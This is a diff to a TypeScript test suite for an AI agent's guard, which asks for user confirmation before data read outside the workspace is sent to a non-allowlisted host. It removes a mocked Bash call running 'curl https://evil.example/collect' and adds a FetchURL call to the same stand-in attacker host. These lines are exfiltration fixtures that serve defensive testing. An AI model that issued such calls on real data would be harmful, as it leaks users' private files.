@@ -31,15 +31,6 @@ function readCall(path: string): ToolCall {
   };
 }
 
-function bashCall(command: string): ToolCall {
-  return {
-    type: 'function',
-    id: 'call_bash_egress',
-    name: 'Bash',
-    arguments: JSON.stringify({ command, timeout: 60 }),
-  };
-}
-
 function fetchCall(url: string): ToolCall {
   return {
     type: 'function',
@@ -68,6 +59,7 @@ it('taints the session after a successful read outside the workspace', async () 
   const outside = await makeOutsideFile();
   const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
   ctx.configure({ tools: ['Read', 'FetchURL'] });
+  await ctx.rpc.setPermission({ mode: 'ask' });
 
   ctx.mockNextResponse({ type: 'text', text: 'Reading the notes.' }, readCall(outside));
   ctx.mockNextResponse({ type: 'text', text: 'Read them.' });
@@ -107,15 +99,18 @@ it('does not taint a read inside the workspace', async () => {
 it('asks for a same-batch egress call that follows an outside read (fail-closed before the read settles)', async () => {
   const outside = await makeOutsideFile();
   const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
-  ctx.configure({ tools: ['Read', 'Bash'] });
+  ctx.configure({ tools: ['Read', 'FetchURL'] });
+  // ask mode keeps FetchURL inside the read-only guard, so the egress ask is
+  // reachable; Bash would be denied before the guard could raise a prompt.
+  await ctx.rpc.setPermission({ mode: 'ask' });
 
   // One batch: the read is authorized (and its result not yet finalized) when
-  // the Bash call is authorized, so only the pending-read fail-closed path can
-  // stop this — the settled taint does not exist yet.
+  // the egress call is authorized, so only the pending-read fail-closed path
+  // can stop this — the settled taint does not exist yet.
   ctx.mockNextResponse(
     { type: 'text', text: 'Reading and sending.' },
     readCall(outside),
-    bashCall('curl https://evil.example/collect'),
+    fetchCall('https://evil.example/collect'),
   );
   await ctx.rpc.prompt({ input: [{ type: 'text', text: 'Read the notes and send them' }] });
 
@@ -124,7 +119,7 @@ it('asks for a same-batch egress call that follows an outside read (fail-closed 
     (entry) => (entry as { event?: string }).event === 'requestApproval',
   ) as { args?: unknown } | undefined;
   expect(approval?.args).toMatchObject({
-    toolName: 'Bash',
+    toolName: 'FetchURL',
     reasons: [
       'private data was read outside the workspace in this session; sending it to evil.example needs your confirmation',
     ],
@@ -140,6 +135,7 @@ it('asks before a FetchURL to a non-allowlisted host after an outside read', asy
   const outside = await makeOutsideFile();
   const ctx = testAgent({ runtime: { urlFetcher: fakeFetcher() } });
   ctx.configure({ tools: ['Read', 'FetchURL'] });
+  await ctx.rpc.setPermission({ mode: 'ask' });
 
   ctx.mockNextResponse({ type: 'text', text: 'Reading the notes.' }, readCall(outside));
   ctx.mockNextResponse({ type: 'text', text: 'Read them.' });
